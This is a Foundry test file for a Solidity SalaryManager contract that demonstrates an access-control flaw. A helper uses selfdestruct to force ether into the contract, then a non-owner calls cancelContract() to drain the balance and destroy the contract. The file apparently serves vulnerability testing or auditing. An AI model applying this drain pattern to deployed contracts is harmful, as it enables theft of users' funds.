
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {SalaryManager} from "../src/SalaryManager.sol";

contract ForceSender {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}

contract TestAccessControlSalaryManager is Test {
    SalaryManager public _contractUnderTest;

    function setUp() public {
        _contractUnderTest = new SalaryManager();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm)); 
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        bytes32 ownerSlot = bytes32(uint256(1));
        address owner = address(uint160(uint256(vm.load(address(_contractUnderTest), ownerSlot))));
        vm.assume(caller != owner);

        vm.deal(address(this), 1 ether);
        new ForceSender{value: 1 ether}(payable(address(_contractUnderTest)));

        uint256 callerBalanceBefore = caller.balance;
        uint256 contractBalanceBefore = address(_contractUnderTest).balance;

        vm.prank(caller);
        _contractUnderTest.cancelContract();

        assertEq(caller.balance, callerBalanceBefore + contractBalanceBefore);
        assertEq(address(_contractUnderTest).balance, 0);
        assertEq(address(_contractUnderTest).code.length, 0);
    }
}
